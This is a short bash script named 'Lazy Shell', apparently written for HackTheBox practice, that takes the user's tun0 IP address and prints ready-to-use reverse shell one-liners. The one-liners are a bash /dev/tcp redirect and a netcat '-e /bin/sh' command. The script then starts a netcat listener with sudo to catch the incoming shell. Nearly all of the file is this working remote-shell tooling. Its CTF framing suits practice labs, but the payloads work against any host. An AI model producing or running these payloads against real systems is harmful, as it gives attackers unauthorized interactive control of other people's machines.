#!/bin/bash

#about - this is a simple bash script to replace the mundane process of
#getting and replacing the information within the pentest monkey reverse shells.
#I suggest you add an alias to your .bashrc or .zshrc with the path to this script to use it on the fly


#gets the ip addr of our tun0, im using this for doing hackthebox machines
#simply replace the interface name for what suits you best
host=$(/sbin/ifconfig tun0 | grep "10.10." | awk '{print $2}')


#banner
printf "
╔══════════════╗
   Lazy Shell
╚══════════════╝\n"
printf "Author: 0xAtti\n"


#menu options
printf "\nOptions\n"
echo "( 1 ) Automatic bash reverse shell"
echo "( 2 ) Automatic netcat reverse shell"
echo "( 3 ) Standard shell text output"
printf "\nSelect option: "

#reads input for options
read -r input


#settings for bash autoshell
if [ $input = 1 ]; then
printf "Enter desired port: "
read -r port1
printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
printf   "  Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port1 0>&1'\n\n"
printf "╚══════════════════════════════════════════════════════════════════╝\n\n"
sudo nc -lvp $port1
fi


#settings for netcat autoshell
if [ $input = 2 ]; then
printf "Enter desired port: "
read -r port2
printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
printf    "    NetCat Shell: nc -e /bin/sh $host $port2\n\n"
printf "╚══════════════════════════════════════════════════════════════════╝\n\n"
sudo nc -lvp $port2
fi


#settings for standard text output, no netcat
if [ $input = 3 ]; then
printf 'Enter desired port: '
read -r port
printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
printf       "  Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n"
printf     "\n  NetCat Shell: nc -e /bin/sh $host $port\n"
printf "\n╚══════════════════════════════════════════════════════════════════╝\n"
exit
fi


#settings for invalid choises - YOU WILL NEED TO EDIT THIS DEPENDING ON WHERE YOU'VE STORED THIS FILE
if [ $input -ge "4" ]; then
printf "Please enter a valid option\n"
sh ~/.config/scripts/shell.sh
fi


#settings to quit
if [ $input = q ]; then
exit
fi

#settings to quit
if [ $input = quit ]; then
exit
fi
